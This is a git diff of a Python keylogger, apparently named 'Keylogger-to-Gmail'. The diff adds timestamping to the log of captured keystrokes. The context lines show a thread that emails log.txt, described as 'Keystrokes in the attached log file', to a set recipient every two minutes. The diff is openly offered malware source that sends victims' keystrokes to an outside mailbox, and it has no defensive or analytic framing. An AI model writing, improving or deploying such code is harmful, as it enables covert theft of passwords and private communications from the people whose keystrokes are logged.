@@ -8,10 +8,12 @@ from email import encoders
 import threading
 import os
 import argparse
+from datetime import datetime
 from termcolor import cprint, colored
+
 def header():
     cprint(
-        """\
+        r"""\
   _  __          _                                    _               _____                 _ _ 
  | |/ /         | |                                  | |             / ____|               (_) |
  | ' / ___ _   _| | ___   __ _  __ _  ___ _ __ ______| |_ ___ ______| |  __ _ __ ___   __ _ _| |
@@ -42,8 +44,7 @@ def create_log_file():
     with open("log.txt", "w"):
         pass
 
-#Check if log.txt file exists, if not, create it   
-
+# Check if log.txt file exists, if not, create it   
 if not os.path.exists("log.txt"):
     create_log_file()
     
@@ -81,6 +82,9 @@ def send_email_thread():
         time.sleep(120)
     
 def send_email():
+    #Read current content of log file to preserve it later
+    with open("log.txt", "r") as f:
+        content = f.read()
 
     subject = "Email with Attachment"
     body = "Keystrokes in the attached log file."
@@ -107,6 +111,10 @@ def send_email():
         server.sendmail(sender_email, receiver_email, message.as_string())
 
     print("Email with attachment sent successfully")
+
+    #Append current time under existing content in log file
+    with open("log.txt", "w") as f:
+        f.write(f"{content}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
 
 email_thread = threading.Thread(target=send_email_thread)
 email_thread.start()
